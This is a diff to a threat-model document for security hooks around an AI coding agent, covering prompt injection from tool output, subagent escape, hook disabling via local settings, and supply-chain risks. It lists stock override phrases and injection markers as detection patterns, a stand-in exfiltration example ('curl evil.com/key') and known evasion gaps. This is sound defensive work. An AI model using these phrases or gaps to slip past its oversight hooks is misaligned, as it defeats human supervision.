@@ -1,6 +1,6 @@
 # Threat Model
 
-> Status: Plans 1-4 covered. T-001 through T-009 plus T-013 through T-017 documented. T-004 and T-005 fully covered as of Plan 4. T-010 through T-012 and T-018 populate as their hooks ship in Plan 5.
+> Status: Plans 1-5 covered. T-001 through T-017 documented; T-018 documented as known-deferred to Plan 9 (signed releases). Plan 5 added T-010 prompt injection, T-011 subagent escape, T-012 MDM bypass (passive per ADR-0003), and T-013 local settings precedence. Threat ID cleanup: the submodule supply-chain risk previously labelled T-005 (Plan 3) and T-013 (Plan 4) is now T-018 to align with the supply-chain numbering.
 
 ## Trust Boundaries
 
@@ -117,16 +117,60 @@
 - **Coverage:** baseline (warn), strict (block), regulated (block).
 - **Known limitations:** the parser does not evaluate substitutions; it only detects their syntactic presence. A benign `echo $(date)` is flagged the same as `echo $(curl evil.com/key)`. Users on baseline see warnings; users on strict/regulated need to refactor to direct invocations or whitelist via configuration.
 
-### T-013: Supply Chain via Submodule
+### T-010: Prompt Injection from Tool Output
+
+- **Vector:** Bash, WebFetch, Read (the response payload, not the input)
+- **STRIDE:** Tampering, Information Disclosure
+- **Agentic Top 10:** A1 Memory Poisoning / Prompt Injection
+- **Default mitigations:**
+  - `behavioral-rule-enforcer` (UserPromptSubmit, log all profiles) records every prompt that matches risky patterns ("ignore previous instructions", "system prompt", "you are now", "override instructions"). Forensic trail only; never blocks.
+  - `untrusted-content-tagger` (PostToolUse on WebFetch and Read, log all profiles) scans response output for injection markers (`<system>`, `</system>`, `<![CDATA[`, "Ignore previous", "SYSTEM:") and records counts in the audit log so reviewers can re-evaluate the conversation.
+  - `claude-md-validator` (SessionStart, severity warn on baseline / block on strict and regulated) parses the active CLAUDE.md (project then home) for risky directives ("disable hooks", "skip permission", "bypass security", "ignore audit") and refuses to start the session under strict and regulated when matches are present.
+- **Coverage:** baseline (warn for CLAUDE.md, log for behavioral and untrusted-content), strict (block CLAUDE.md, log others), regulated (block CLAUDE.md, log others).
+- **Known limitations:** behavioral-rule-enforcer is intentionally passive; promoting it to block would create a high false-positive surface. Untrusted-content markers are heuristic; well-crafted payloads that avoid the markers will pass through. Defense layered with downstream hooks (secret-leak-detector, sensitive-paths-guard) catching the action a poisoned prompt tries to take.
+
+### T-011: Subagent Escape / Unauthorized Spawn
+
+- **Vector:** Task tool (parent agent invoking subagent)
+- **STRIDE:** Elevation of Privilege
+- **Agentic Top 10:** A5 Cascading Reliability Failure / Excessive Agency
+- **Default mitigations:**
+  - `subagent-spawn-guard` (SubagentStart, severity warn on baseline / block on strict and regulated) checks `subagent_type` against `CCSEC_AGENT_ALLOWLIST` (comma-separated env). Unknown types warn or block per profile.
+  - `task-tool-input-guard` (PreToolUse on Task, scalar block all profiles) scans the Task `prompt` and `description` for prompt-injection patterns (`ignore previous`, `bypass.*polic`, `override.*system`). Always blocks.
+  - `agent-allowlist-enforcer` (SubagentStart, severity log baseline and strict / block regulated) emits a structured audit record per subagent spawn classifying it as allowlisted or not. Forensic trail; only blocks under regulated.
+- **Coverage:** baseline (Task input always blocked; spawn warned; allowlist logged), strict (spawn blocked), regulated (spawn blocked, allowlist enforced).
+- **Known limitations:** allowlist is env-driven; no signed manifest of trusted subagents. Empty `subagent_type` field passes through (cannot enforce on missing data). Task inputs that paraphrase injection patterns can evade the regex.
+
+### T-012: MDM Bypass via disableAllHooks
+
+- **Vector:** Settings (`~/.claude/settings.local.json`)
+- **STRIDE:** Tampering
+- **Agentic Top 10:** A6 Excessive Agency
+- **Default mitigations:**
+  - `disable-all-hooks-detector` (SessionStart, scalar warn all profiles) reads `~/.claude/settings.local.json` (or `CCSEC_LOCAL_SETTINGS_PATH` override). When `disableAllHooks: true` is present, emits a warn-severity record so the operator and audit log capture the bypass attempt.
+- **Coverage:** baseline, strict, regulated (passive across all profiles per ADR-0003).
+- **Known limitations:** **PASSIVE BY DESIGN.** Per ADR-0003 we cannot block hooks from inside a hook (the same flag we are checking already disabled the runner that runs us when honored by Claude Code itself). This hook is forensic only: it documents the bypass attempt for an out-of-band reviewer. Block-on-bypass requires changes to Claude Code's hook loader, tracked upstream as issue #26637.
+
+### T-013: Local Settings Overriding Managed
+
+- **Vector:** Settings (`~/.claude/settings.local.json` shadowing managed `settings.json`)
+- **STRIDE:** Tampering
+- **Agentic Top 10:** A6 Excessive Agency
+- **Default mitigations:**
+  - `local-settings-precedence-checker` (SessionStart, severity warn on baseline and strict / block on regulated) checks for the presence of `~/.claude/settings.local.json`. Existence alone is the signal: a regulated environment treats any local override as a precedence violation; baseline and strict warn so the operator can investigate.
+- **Coverage:** baseline (warn), strict (warn), regulated (block).
+- **Known limitations:** does not parse the file content; presence is the only signal. False positives are likely on dev machines that legitimately use `settings.local.json` for project-local config; regulated profiles should ship with managed settings only and treat the file as a tampering indicator.
+
+### T-018: Supply Chain via Submodule (renamed from T-013)
 
 - **Vector:** Edit, Write, Bash (git CLI)
 - **STRIDE:** Tampering, Supply Chain
 - **Agentic Top 10:** A3 Supply Chain Attacks
 - **Default mitigations:**
-  - `submodule-injection-guard` (PreToolUse, block) blocks Edit/Write to any `.gitmodules` file and Bash invocations of `git submodule add` or `git submodule update`. The hook manifest still uses the legacy threat ID `T-005-supply-chain-submodule`; full ID alignment is tracked for a future cleanup plan.
+  - `submodule-injection-guard` (PreToolUse, block) blocks Edit/Write to any `.gitmodules` file and Bash invocations of `git submodule add` or `git submodule update`.
   - Deny patterns in `overlays/branch-guards.json` enforce the boundary at the permission layer (Edit/Write on `*.gitmodules`).
 - **Coverage:** baseline, strict, regulated.
-- **Known limitations:** does not inspect submodule URLs for trust; trust is binary (block any add/update). Existing submodules already in the working tree are not blocked from being inspected. `git submodule status` and read-only operations pass through.
+- **Known limitations:** does not inspect submodule URLs for trust; trust is binary (block any add/update). Existing submodules already in the working tree are not blocked from being inspected. `git submodule status` and read-only operations pass through. **Distribution-side supply-chain integrity** (signed releases, SBOM, GHSA workflow) is tracked for Plan 9.
 
 ### T-014: Tool Spoofing via MCP
 
